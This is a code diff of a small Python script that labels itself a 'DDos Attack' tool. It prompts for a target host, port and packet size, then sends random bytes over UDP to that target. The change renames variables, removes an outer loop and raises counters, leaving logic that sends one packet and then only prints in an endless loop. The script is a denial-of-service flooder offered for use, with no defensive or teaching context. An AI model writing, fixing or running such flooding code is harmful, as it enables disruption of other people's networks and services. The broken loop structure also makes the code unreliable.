@@ -10,20 +10,18 @@ target_host = raw_input("HOST :")
 target_port = input("Port :")
 i = 1
 packetes = input("Bytes :")
-#Multiples IPS
-while True:
 #packet
-socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(packetes)
-socket.sendto(bytes, (target_host, target_port))
+sock.sendto(bytes, (target_host, target_port))
 os.system("clear")
 os.system("figlet DDos Attack")
 #conexion_client
-sent = 999
-pysendfile = 0
+
+sent = 65000
+pysendfile = 65000
 while True:
 
  print(bytes, target_host, target_port, i)
  
  i = i + 1
-            
